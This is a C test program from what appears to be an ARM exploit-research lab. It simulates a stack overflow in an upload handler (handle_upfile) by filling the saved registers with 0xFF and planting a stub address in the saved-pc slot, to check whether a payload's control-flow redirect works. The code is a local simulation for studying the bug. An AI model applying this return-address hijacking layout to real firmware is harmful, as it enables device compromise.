#include "../common/semihosting.h"

/*
 * Extends experiment 02's control-flow check to the *exact* frame shapes
 * of the real bug: memcpy() (push {r4,r5,lr} / pop {r4,r5,pc}) called
 * from handle_upfile() (push {r4,r5,r6,r7,r8,lr} / pop {r4,r5,r6,r7,r8,pc}),
 * with the real gen_payload.py byte pattern applied to the live stack:
 * memcpy's own saved-lr preserved untouched, the 20-byte gap (handle_
 * upfile's saved r4-r8) filled with 0xFF, and the redirect placed at
 * handle_upfile's saved-pc slot.
 *
 * Question this answers that experiment 02 couldn't: does clobbering
 * handle_upfile's saved r4-r8 with 0xFF break the redirect - e.g. if
 * something between the pop{pc} and the eventual jump target depends on
 * those registers per AAPCS callee-saved conventions - or does the
 * redirect work exactly as experiment 02 suggested, and the real
 * hardware failure has a different cause.
 */

extern void handle_upfile_sim(void);

static int reached_stub;
static int reached_normal_return;

void stub(void);

void network_write_sim(unsigned int *sp)
{
	unsigned char *base = (unsigned char *)sp;
	unsigned int i;

	print_str("network_write_sim: memcpy_sim's own sp = ");
	print_hex32((unsigned int)sp);
	sh_writec('\n');

	print_str("network_write_sim: memcpy's own saved-lr (sp+8) = ");
	print_hex32(*(unsigned int *)(base + 8));
	print_line("  (left untouched - this is the 'preserve' part of the fix)");

	/* handle_upfile's saved r4,r5,r6,r7,r8 - sp+12 .. sp+31 - 0xFF fill,
	 * exactly like the real payload leaves everything but the two
	 * explicitly-computed slots. */
	for (i = 12; i < 32; i++)
		base[i] = 0xFF;

	/* handle_upfile's saved pc - sp+32 - the actual redirect. */
	*(unsigned int *)(base + 32) = (unsigned int)stub;
	print_str("network_write_sim: planted stub at handle_upfile's saved-pc, sp+32 = ");
	print_hex32((unsigned int)(base + 32));
	sh_writec('\n');
}

__attribute__((noinline))
void stub(void)
{
	reached_stub = 1;
	print_line("stub: reached via handle_upfile's pop{r4,r5,r6,r7,r8,pc} - redirect worked");
	print_line("stub: even with r4-r8 clobbered to 0xFFFFFFFF by the 0xFF fill");
	sh_exit(reached_stub && !reached_normal_return ? 0 : 1);
}

int main(void)
{
	print_line("arm-selfmod-lab: experiment 04");
	print_line("Full real-frame-shape stack-redirect check (memcpy+handle_upfile nesting)");

	handle_upfile_sim();

	/* Only reached if handle_upfile_sim() returned normally - i.e. the
	 * redirect at its saved-pc slot did NOT take effect. */
	reached_normal_return = 1;
	print_line("RESULT: FAIL - handle_upfile_sim() returned normally.");
	print_line("The stack overwrite did not redirect control flow in this frame shape.");
	return 1;
}
